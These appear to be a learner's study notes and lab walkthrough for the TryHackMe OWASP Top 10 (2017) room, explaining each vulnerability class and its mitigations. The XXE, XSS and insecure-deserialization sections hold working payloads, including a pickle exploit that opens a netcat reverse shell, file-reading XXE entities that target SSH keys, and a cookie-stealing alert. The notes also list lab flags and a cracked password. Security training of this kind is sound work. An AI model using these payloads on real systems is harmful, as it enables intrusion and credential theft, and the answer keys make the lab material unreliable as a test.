# OWASP top 10 (2017)

## Severity 1 

### Injection

Common injection attack examples:

- SQL injection -> user input passed to SQL queries allowing manipulation
- Command injection -> input is passed to sytem commands allowing arbitrary system command execution

After the attacker successfully passes input and it is interpreted correctly they can:

- Access, modify and delete information in a database e.g steal credentials or personal details
- Execute arbitrary system commands on a server allowing an attacker to gain access to users' systems

Preventative measures:

- Use a whitelist/allow list, rejecting unsafe input
- Stripping input, removing the dangerous characters before they're processed

### Command Injection

Command injection occurs when server-side code in a web app makes a system call on the hosting machine. It's a vulnerability that allows an attacker to take advantage of the system call to execute OS commands on the server

### Command Injection Practical

What strange text file is in the website root directory? 
- drpepper.txt

What user is this app running as?
- www-data

What's the users' shell set as?
- /usr/sbin/nologin

What version of Ubuntu is running?
- 18.04.4

Print out the MOTD, what favourite beverage is mentioned?
- Dr Pepper

## Severity 2

### Broken Authentication (now Identification and Authentication Failures)

If an attacker finds flaws in an authentication mechanism they can exploit them to gain access to other users' accounts and sensitive data.

Common flaws in authentication mechanisms are:

- Brute force attacks: Launch brute force attacks using multiple auth attempts to guess username password combinations
- Use of weak credentials: Without strong password policies passwords can be guessed easily without brute forcing and without multiple attempts
- Weak session cookies: If session cookies contain predictable values, an atacker can set their own cookies and access other users' accounts

Mitigation depending on the flaw:

- To avoid brute forcing, set an automatic lockout after a certain number of failed attempts
- To avoid guessing of passwords, set a strong password policy
- Implement MFA, making accessing credentials more difficult

### Broken Authentication Practical

What is the flag found in darren's account?
- fe86079416a21a3c99937fea8874b667

What is the flag found in arthur's account? 
- d9ac0f7db4fda460ac3edeb75d75e16e

## Severity 3

### Sensitive Data Exposure (now Cryptographic Failure)

When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data 
Exposure".This is often data directly linked to customers (e.g. names, dates-of-birth,
financial information, etc), but could also be more technical information, such as usernames
and passwords. At more complex levels this often involves techniques such as a "Man in The 
Middle Attack", whereby the attacker would force user connections through a device which 
they control, then take advantage of weak encryption on any transmitted data to gain access 
to the intercepted information (if the data is even encrypted in the first place...). Of 
course, many examples are much simpler, and vulnerabilities can be found in web apps which 
can be exploited without any advanced networking knowledge.

### Sensitive Data Exposure Practical

What is the name of the mentioned directory?
- /assets

Navigate to the directory you found in question one. What file stands out as being likely to
contain sensitive data?
- webapp.db

Use the supporting material to access the sensitive data. What is the password hash of the 
admin user?
- 6eea9b7ef19179a06954edd0f6c05ceb

Crack the hash.
What is the admin's plaintext password?
- qwertyuiop

Login as the admin. What is the flag?
- THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Severity 4

### XML External Entities (now consolidated with Security Misconfigurations)

XXE attacks abuse features of XML parsers/data. It often allows an attacker to interact 
with any backend or external systems that the application itself can access and can allow 
the attacker to read the file on that system. They can also cause Denial of Service (DoS) 
attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web 
application to make requests to other applications. XXE may even enable port scanning and 
lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
1) An in-band XXE attack is the one in which the attacker can receive an immediate response 
to the XXE payload.

2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the 
web application and attacker has to reflect the output of their XXE payload to some other 
file or their own server.

### eXtensible Markup Language

What is XML?

XML (eXtensible Markup Language) is a markup language that defines a set of rules for 
encoding documents in a format that is both human-readable and machine-readable. It is a 
markup language used for storing and transporting data. 

Why we use XML?

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.

2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.

3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

Syntax

Every XML document mostly starts with what is known as XML Prolog.

<?xml version="1.0" encoding="UTF-8"?>

Above the line is called XML prolog and it specifies the XML version and the encoding used 
in the XML document. This line is not compulsory to use but it is considered a 
`good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element. For example:

<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>

In the above example the <mail> is the ROOT element of that document and <to>, <from>, 
<subject>, <text> are the children elements. If the XML document doesn't have any root 
element then it would be considered `wrong` or `invalid` XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like 
<to> then it has to end by </to> and not by something like </To>(notice the capitalization 
of T)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very 
similar to HTML. For example:
<text category = "message">You need to learn about XXE</text>

In the above example category is the attribute name and message is the attribute value.

### XXE Payload

read /etc/passwd:
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

read users ssh keys:
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/*username*/.ssh/id_rsa'>]>
<root>&read;</root>
```

### XXE Practical

What is the name of the user in /etc/passwd?
- falcon

Where is falcon's SSH key located?
- /home/falcon/.ssh/id_rsa

What are the first 18 characters for falcon's private key
- MIIEogIBAAKCAQEA7b

## Severity 5

### Broken Access Control

A regular visitor being able to access protected pages, can lead to the following:

    Being able to view sensitive information
    Accessing unauthorized functionality

OWASP have a listed a few attack scenarios demonstrating access control weaknesses:

Scenario #1: The application uses unverified data in a SQL call that is accessing account information:
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
http://example.com/app/accountInfo?acct=notmyacct

Scenario #2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo

If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.

### IDOR

IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

## Severity 6

### Security Misconfiguration

Security misconfigurations include:
- Poorly configured permissions on cloud services, like S3 buckets
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Error messages that are overly detailed and allow an attacker to find out more about the system
- Not using HTTP security headers, or revealing too much detail in the Server: HTTP header

This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.

Default passwords

## Severity 7

### XSS

Cross-site scripting is a type of injection allowing an attacker to execute malicious scripts and have it execute on a victim's machine.

A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:

- Stored XSS: the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
    
- Reflected XSS: the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
    
- DOM-Based XSS: DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.

XSS  payloads:

- Popup's (<script>alert(“Hello World”)</script>): Creates a Hello World message popup on a users browser.

- Writing HTML (document.write): Override the website's HTML to add your own (essentially defacing the entire page).

- XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html): You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.

- Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html): A mini local port scanner.

### XSS Challenge

Craft a reflected XSS payload that will cause a popup saying "Hello".

payload: `<script>alert("Hello")</script>`

answer: ThereIsMoreToXSSThanYouThink

Craft a reflected XSS payload that will cause a popup with your machines IP address

payload: `<script>alert(window.location.hostname)</script>`

answer: ReflectiveXss4TheWin

Add a comment and see if you can insert some of your own HTML.

payload: `<a href='www.google.com'></a>`

answer: HTML_T4gs

Create an alert popup box appear on the page with your document cookies.

payload: `<script>alert(document.cookie)</script>`

answer: W3LL_D0N3_LVL2

Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

payload: `document.querySelector('#thm-title').textContent = 'I am a hacker'`

answer: websites_can_be_easily_defaced_with_xss

## Severity 8

### Insecure Deserialization

Insecure deserialization is replacing data processed by an application with malicious code;
allowing anything from DoS to RCE that the attacker can use to gain a foothold in a
pentesting scenario.

The malicious code leverages the legitimate serialization and deserialization process used
by web applications.

OWASP rank this vuln 8/10 because:

- Low exploitability. This vuln is often a case-by-case basis: there is no reliable 
tool/framework for it.

- The exploit is only as dangerous as the attacker's skill permits and the data that is
exposed

What's vulnerable?

- E-Commerce sites
- Forums
- APIs
- Application runtimes (Tomcat, Jenkins, Jboss, etc.)

### Cookies Practical

1st flag:

method: base64 decode sessionId cookie

answer: THM{good_old_base64_huh}

2nd flag:

method: change userType cookie value to admin

answer: THM{heres_the_admin_flag}

### Code Execution

When you visit the "Exchange your vim" URL, A cookie is encoded and stored within your
browser: perfect for us to modify! Once you visit the feedback form, the value of this 
cookie is decoded and then deserialised. Uh oh. In the snippet below, we can see how the 
cookie is retrieved and then deserialized via pickle.loads

This vulnerability exploits python Pickle, giving us free regin to execute whatever we like
such as a reverse shell

base64 encoded payload:
```
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

paste the payload into the cookie value

start a netcat listener on our machine `nc -lnvp 4444`

refresh the page and check our listener for a shell

flag.txt:

answer: 4a69a7ff9fd68

## Severity 9

### Components With Known Vulnerabilities

If a system is using a component with known vulnerabilities our main job is to find the 
information of the software and research it until we find an exploit

### Components With Known Vulnerabilities Lab

Find an RCE exploit for Online Book Store 1.0

answer: exploitdb 47887

Get RCE on Book Store

payload: `python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://BOOKSTORE_URL`

Find word count of /etc/passwd

payload: `wc -c /etc/passwd`

answer: 1611

## Severity 10

### Insufficient Logging and Monitoring

When web applications are set up, every action performed by the user should be logged.
Logging is important because in the event of an incident, the attackers actions can be 
traced. Once their actions are traced, their risk and impact can be determined. Without 
logging, there would be no way to tell what actions an attacker performed if they gain 
access to particular web applications. The bigger impacts of these include:

- regulatory damage: if an attacker has gained access to personally identifiable user 
information and there is no record of this, not only are users of the application affected, 
but the application owners may be subject to fines or more severe actions depending on 
regulations.

- risk of further attacks: without logging, the presence of an attacker may be undetected. 
This could allow an attacker to launch further attacks against web application owners by 
stealing credentials, attacking infrastructure and more.

The information stored in logs should include:

- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses

These logs do have some sensitive information on them so its important to ensure that logs 
are stored securely and multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. 
The ideal case is having monitoring in place to detect any suspicious activity. The aim of 
detecting this suspicious activity is to either stop the attacker completely or reduce the 
impact they've made if their presence has been detected much later than anticipated. Common 
examples of suspicious activity includes:

- multiple unauthorised attempts for a particular action (usually authentication attempts 
or access to unauthorised resources e.g. admin pages)

- requests from anomalous IP addresses or locations: while this can indicate that someone 
else is trying to access a particular user's account, it can also have a false positive 
rate.

- use of automated tools: particular automated tooling can be easily identifiable e.g. 
using the value of User-Agent headers or the speed of requests. This can indicate an 
attacker is using automated tooling.

- common payloads: in web applications, it's common for attackers to use Cross Site 
Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of 
someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be 
rated according to the impact level. For example, certain actions will higher impact than 
others. These higher impact actions need to be responded to sooner thus they should raise 
an alarm which raises the attention of the relevant party.

